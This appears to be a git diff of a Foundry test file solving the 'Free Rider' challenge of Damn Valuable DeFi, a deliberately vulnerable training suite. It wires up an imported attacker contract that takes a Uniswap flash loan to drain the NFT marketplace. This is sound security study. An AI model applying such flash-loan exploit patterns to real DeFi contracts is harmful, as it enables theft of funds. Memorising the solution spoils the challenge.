@@ -10,6 +10,8 @@ import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
 
+import {FreeRiderAttacker} from "./FreeRiderAttacker.sol";
+
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
     uint256 internal constant NFT_PRICE = 15 ether;
@@ -37,7 +39,7 @@ contract FreeRider is Test {
     address payable internal deployer;
 
     //new
-    FreeRiderNFTMarketplace public marketplace;
+    FreeRiderAttacker public attackContract;
 
     function setUp() public {
         /**
@@ -125,8 +127,6 @@ contract FreeRider is Test {
 
         vm.stopPrank();
 
-        //marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
-
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
@@ -134,28 +134,24 @@ contract FreeRider is Test {
         /**
          * EXPLOIT START *
          */
-        vm.deal(attacker, 25 ether);
-        console.log(attacker.balance);
-
-        uint256[] memory NFTsToBuy = new uint256[](6);
-
-        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
-            NFTsToBuy[i] = i;
-            unchecked {
-                ++i;
-            }
-        }
-
         vm.startPrank(attacker, attacker);
-        freeRiderNFTMarketplace.buyMany{value: 15 ether}(NFTsToBuy);
-        console.log(attacker.balance);
+        attackContract = new FreeRiderAttacker(
+            attacker,
+            address(uniswapV2Pair),
+            address(uniswapV2Factory),
+            address(weth),
+            freeRiderNFTMarketplace,
+            freeRiderBuyer
+        );
+
+        attackContract.flashLoan(15e18);
+        console.log("attack balance is", attacker.balance);
 
         for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
             damnValuableNFT.safeTransferFrom(attacker, address(freeRiderBuyer), tokenId);
         }
-        vm.stopPrank();
 
-        console.log(attacker.balance);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
